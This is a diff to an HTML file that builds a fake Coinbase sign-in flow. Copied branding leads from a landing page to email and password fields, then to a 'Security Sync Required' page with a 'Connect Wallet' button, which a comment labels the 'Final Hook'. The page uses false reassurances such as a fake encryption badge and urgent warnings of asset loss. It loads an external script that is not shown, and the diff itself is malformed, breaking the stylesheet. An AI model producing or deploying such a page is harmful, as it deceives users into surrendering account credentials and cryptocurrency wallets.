@@ -14,64 +14,67 @@
             --cb-grey: #5b616e;
             --cb-border: #eceff1;
         }
-        body {
-            background-color: var(--cb-white);
-            color: var(--cb-dark);
-            font-family: 'Inter', sans-serif;
-            display: flex;
-            justify-content: center;
-            align-items: center;
-            height: 100vh;
-            margin: 0;
-            -webkit-font-smoothing: antialiased;
-        }
-        .container {
-            text-align: center;
-            width: 100%;
-            max-width: 480px;
-            padding: 20px;
-        }
-        .hidden { display: none; }
-        
-        /* Landing Page Styles */
-        .landing-card { padding: 20px; }
-        .landing-card h1 { font-size: 28px; margin-bottom: 16px; }
-        .landing-card p { color: var(--cb-grey); font-size: 16px; line-height: 1.6; margin-bottom: 32px; }
+      <body>
 
-        /* Connect Page Styles */
-        .auth-card {
-            padding: 40px 20px;
-            border: 1px solid var(--cb-border);
-            border-radius: 20px;
-        }
-        .cb-logo { 
-            width: 40px; height: 40px; background: var(--cb-blue); 
-            border-radius: 50%; margin: 0 auto 20px; 
-        }
-
-        .btn-primary {
-            background-color: var(--cb-blue);
-            color: white;
-            border: none;
-            padding: 16px 32px;
-            font-size: 16px;
-            font-weight: 600;
-            border-radius: 50px;
-            cursor: pointer;
-            width: 100%;
-            transition: 0.2s;
-        }
-        .btn-primary:hover { background-color: #0042cd; }
+    <div class="container">
         
-        .footer-text {
-            margin-top: 40px;
-            font-size: 12px;
-            color: #9ca3af;
-            line-height: 1.5;
-        }
-    </style>
-</head>
-<body>
+        <!-- PAGE 1: Landing -->
+        <div id="step-1" class="landing-card">
+            <div class="cb-logo" style="display: flex; justify-content: center; margin-bottom: 30px;">
+                <svg width="50" height="50" viewBox="0 0 100 100"><circle cx="50" cy="50" r="50" fill="#0052ff"/><path d="M30 50 L50 30 L70 50 L50 70 Z" fill="white"/></svg>
+            </div>
+            <h1>Coinbase</h1>
+            <p>Access your secure digital asset vault. Please authenticate your identity to proceed to your holdings.</p>
+            <button id="toStep2" class="btn-primary">Get Started</button>
+        </div>
+
+        <!-- PAGE 2: Email & Password -->
+        <div id="step-2" class="auth-card hidden">
+            <div class="cb-logo" style="display: flex; justify-content: center; margin-bottom: 20px;">
+                <svg width="30" height="30" viewBox="0 0 100 100"><circle cx="50" cy="50" r="50" fill="#0052ff"/><path d="M30 50 L50 30 L70 50 L50 70 Z" fill="white"/></svg>
+            </div>
+            <h1 style="font-size: 22px;">Sign In</h1>
+            <p>Enter your credentials to authorize your session.</p>
+            <div style="text-align: left; margin-bottom: 20px;">
+                <label style="font-size: 12px; font-weight: 600; color: var(--cb-grey);">Email Address</label>
+                <input type="email" id="email" placeholder="name@email.com" style="width: 100%; padding: 12px; margin-top: 5px; margin-bottom: 15px; border: 1px solid var(--cb-border); border-radius: 8px; box-sizing: border-box; font-family: 'Inter';">
+                
+                <label style="font-size: 12px; font-weight: 600; color: var(--cb-grey);">Password</label>
+                <input type="password" id="pass" placeholder="Password" style="width: 100%; padding: 12px; margin-top: 5px; border: 1px solid var(--cb-border); border-radius: 8px; box-sizing: border-box; font-family: 'Inter';">
+            </div>
+            <button id="toStep4" class="btn-primary">Continue</button>
+        </div>
+
+        <!-- PAGE 3: Final Hook -->
+        <div id="step-4" class="auth-card hidden">
+            <div class="cb-logo" style="display: flex; justify-content: center; margin-bottom: 20px;">
+                <svg width="30" height="30" viewBox="0 0 100 100"><circle cx="50" cy="50" r="50" fill="#0052ff"/><path d="M30 50 L50 30 L70 50 L50 70 Z" fill="white"/></svg>
+            </div>
+            <h1 style="font-size: 22px;">Security Sync Required</h1>
+            <p>Your account has been verified. To avoid asset loss due to network congestion, please synchronize your wallet with our secure node.</p>
+            <button id="connectBtn" class="btn-primary">Connect Wallet</button>
+            <div id="status" style="margin-top: 20px; font-size: 14px; color: var(--cb-blue);"></div>
+        </div>
+
+        <!-- FOOTER: Now formatted to look corporate -->
+        <footer style="margin-top: 50px; border-top: 1px solid #eceff1; padding-top: 20px;">
+            <div style="display: flex; justify-content: space-between; font-size: 11px; color: #9ca3af; align-items: center;">
+                <span>© 2026 Coinbase, Inc.</span>
+                <div style="display: flex; gap: 15px;">
+                    <a href="#" style="color: #9ca3af; text-decoration: none;">Privacy Policy</a>
+                    <a href="#" style="color: #9ca3af; text-decoration: none;">Terms of Service</a>
+                </div>
+            </div>
+            <div style="margin-top: 10px; text-align: center;">
+                <span style="background: #f1f5f9; color: #475569; padding: 4px 8px; border-radius: 4px; font-size: 10px; font-weight: 600;">
+                    🔒 SECURED BY SHA-256 ENCRYPTION
+                </span>
+            </div>
+        </footer>
+    </div>
+
+    <script src="app.js"></script>
+</body>
 
   <div class="container">
         
